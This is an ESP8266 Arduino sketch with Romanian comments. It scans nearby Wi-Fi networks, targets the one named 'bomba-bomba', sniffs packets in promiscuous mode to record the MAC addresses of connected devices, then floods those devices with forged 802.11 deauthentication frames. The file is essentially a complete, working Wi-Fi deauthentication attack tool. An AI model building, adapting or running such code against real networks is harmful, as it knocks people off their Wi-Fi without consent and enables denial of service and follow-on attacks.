#include <Arduino.h>
#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

#define MAX_BSSIDS 50
//////////////////////////////       packet format + usefull data structures      /////////////////////////////////////////


typedef struct
{
  signed rssi : 8;   /**< signal intensity of packet */
  unsigned rate : 4; /**< data rate */
  unsigned is_group : 1;
  unsigned : 1;          /**< reserve */
  unsigned sig_mode : 2; /**< 0:is not 11n packet; 1:is 11n packet */
  unsigned legacy_length : 12;
  unsigned damatch0 : 1;
  unsigned damatch1 : 1;
  unsigned bssidmatch0 : 1;
  unsigned bssidmatch1 : 1;
  unsigned mcs : 7;          /**< if is 11n packet, shows the modulation(range from 0 to 76) */
  unsigned cwb : 1;          /**< if is 11n packet, shows if is HT40 packet or not */
  unsigned HT_length : 16;   /**< reserve */
  unsigned smoothing : 1;    /**< reserve */
  unsigned not_sounding : 1; /**< reserve */
  unsigned : 1;              /**< reserve */
  unsigned aggregation : 1;  /**< Aggregation */
  unsigned stbc : 2;         /**< STBC */
  unsigned fec_coding : 1;   /**< Flag is set for 11n packets which are LDPC */
  unsigned sgi : 1;          /**< SGI */
  unsigned rxend_state : 8;
  unsigned ampdu_cnt : 8; /**< ampdu cnt */
  unsigned channel : 4;   /**< which channel this packet in */
  unsigned : 4;           /**< reserve */
  signed noise_floor : 8;
} wifi_pkt_rx_ctrl_t;


typedef struct
{
  wifi_pkt_rx_ctrl_t rx_ctrl; /**< metadata header */
  uint8_t payload[0];         /**< Data or management payload. Length of payload is described by rx_ctrl.sig_len. Type of content determined by packet type argument of callback. */
} wifi_promiscuous_pkt_t;

typedef struct {
  uint8_t bssid[MAX_BSSIDS][6];
  uint8_t count;
} BSSID_Set;

typedef struct {
  uint8_t *BSSID;   // MAC address (6 bytes)
  uint8_t channel;  // canalul WiFi (1..14 la 2.4GHz)
  int8_t RSSI;      // nivelul semnalului (negativ, ex. -70 dBm)
  BSSID_Set set_dispozitive;
} network;


////////////////////////////          BSSID set implementation                //////////////////////////////


void initBSSIDSet(BSSID_Set &set) {
  set.count = 0;
}
bool addBSSID(BSSID_Set &set, const uint8_t newBSSID[6]) {

  for (uint8_t i = 0; i < set.count; i++) {
    if (memcmp(set.bssid[i], newBSSID, 6) == 0) {
      return false;
    }
  }


  if (set.count < MAX_BSSIDS) {
    memcpy(set.bssid[set.count], newBSSID, 6);
    set.count++;
    return true;
  } else {
    return false;
  }
}

void printBSSIDSet(const BSSID_Set &set) {
  Serial.printf("Total BSSID-uri in set: %d\n", set.count);
  for (uint8_t i = 0; i < set.count; i++) {
    Serial.printf("BSSID %d: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  i + 1,
                  set.bssid[i][0], set.bssid[i][1], set.bssid[i][2],
                  set.bssid[i][3], set.bssid[i][4], set.bssid[i][5]);
  }
}

///////////////////////////////         global variables                ///////////////////////////////////////

bool scan = false;
network *x;
int single_target;
uint8_t counter = 0;
uint8_t counter_dispozitive = 0;
bool ok = true;



/////////////////////////     deauth packet       //////////////////////////////////

uint8_t deauth_packet[26] = {
  0xC0, 0x00,                          // type, subtype c0: deauth (a0: disassociate)
  0x00, 0x00,                          // duration (SDK takes care of that)
  0XFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // reciever (target)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // source (ap)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID (ap)
  0x00, 0x00,                          // fragment & squence number
  0x01, 0x00                           // reason code (1 = unspecified reason)
};



///////////////////////////////////////////////////////////

void sniffer_function(uint8_t *buf, uint16_t len) {

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;


  const uint8_t *payload = ppkt->payload;
  if (len < 24) return;
  uint8_t beacon_frame[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  uint8_t *personal_BSSID = x[single_target].BSSID;

  bool cond1 = memcmp(personal_BSSID, payload + 10, 6);
  bool cond2 = memcmp(personal_BSSID, payload + 4, 6);
  bool cond3 = memcmp(personal_BSSID, payload + 16, 6);

  if (counter < 200 && memcmp(beacon_frame, payload + 4, 6) != 0 && (!cond1 || !cond2 || !cond3)) {

    if (cond1) {
      addBSSID(x[single_target].set_dispozitive, payload + 10);
      if (counter % 20 == 0) Serial.println("cond1");
    } else if (cond2) {
      addBSSID(x[single_target].set_dispozitive, payload + 4);
      if (counter % 20 == 0) Serial.println("cond2");
    }
    counter++;
  } else if (counter == 200) {
    Serial.printf("counter:%d\n", counter);  
    counter++;
    printBSSIDSet(x[single_target].set_dispozitive);
  }
}

void printMAC(uint8_t *b) {
  Serial.printf("  BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                b[0], b[1], b[2],
                b[3], b[4], b[5]);
}

void printNetwork(network net) {
  Serial.printf("  Network --> ");
  printMAC(net.BSSID);
  Serial.printf("  Channel: %d\n", net.channel);
  Serial.printf("  RSSI: %d dBm\n", net.RSSI);
}

void deauth_attack(network retea) {
  uint8_t deauth[26];
  // uint8_t device[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  uint8_t first_4bytess[4] = { 0xC0, 0x00, 0x00, 0x00 };
  uint8_t last_4bytes[4] = { 0x00, 0x00, 0x01, 0x00 };
  memcpy(deauth, first_4bytess, 4);
  memcpy(deauth + 22, last_4bytes, 4);

  for (int i = 0; i < retea.set_dispozitive.count; i++) {

    memcpy(deauth + 4, retea.set_dispozitive.bssid[i], 6);
    memcpy(deauth + 10, retea.BSSID, 6);
    memcpy(deauth + 16, retea.BSSID, 6);

    // printPacket(deauth, sizeof(deauth));
    int result = wifi_send_pkt_freedom(deauth, sizeof(deauth), false);
    // if (result == 0) {
    //   Serial.println("Pachet trimis cu succes!");
    // } else {
    //   Serial.printf("Eroare la trimiterea pachetului: %d\n", result);
    // }
  }
}


void sniff_packets(network retea) {
  wifi_set_channel(retea.channel);
  wifi_set_promiscuous_rx_cb(sniffer_function);
  wifi_promiscuous_enable(true);
  Serial.println("Promiscuous mode enabled.");
}

void printPacket(const uint8_t *packet, size_t length) {
  Serial.println("Pachet deautentificare:");
  for (size_t i = 0; i < length; i++) {
    Serial.printf("%02X ", packet[i]);
    if ((i + 1) % 8 == 0) Serial.println();
  }
  Serial.println();
}

void setup() {
  Serial.begin(115200);
  wifi_station_disconnect();
}
void loop() {


  if (!scan) {
    Serial.println("Starting Wi-Fi scan...");
    int n = WiFi.scanNetworks();
    int channel;
    if (n == 0) {
      Serial.println("No network found");
    } else {
      Serial.printf("%d networks found:\n", n);
      x = new network[n];
      for (int i = 0; i < n; i++) {
        Serial.printf("%d: %s (Channel: %d, RSSI: %d dBm)\n",
                      i + 1,
                      WiFi.SSID(i).c_str(),
                      WiFi.channel(i),
                      WiFi.RSSI(i));
        if (WiFi.SSID(i) == "bomba-bomba") {
          single_target = i;
          Serial.printf(" BSSID: ");
          printMAC(WiFi.BSSID(i));
        }
        x[i].BSSID = WiFi.BSSID(i);
        x[i].channel = WiFi.channel(i);
        x[i].RSSI = WiFi.RSSI(i);
        initBSSIDSet(x[i].set_dispozitive);
      }
    }
    scan = true;
    for (int i = 0; i < n; i++) {
      // printNetwork(x[i]);
    }
    sniff_packets(x[single_target]);
    delay(4000);
  }
  if (counter >= 200) {
    if (ok == true) {
      Serial.println("deauth after sniff finish");
      ok = false;
      wifi_set_channel(x[single_target].channel);
      wifi_set_opmode(STATION_MODE);
      wifi_promiscuous_enable(false);
      wifi_set_channel(8);
      wifi_promiscuous_enable(true);
    }
    deauth_attack(x[single_target]);
  }

}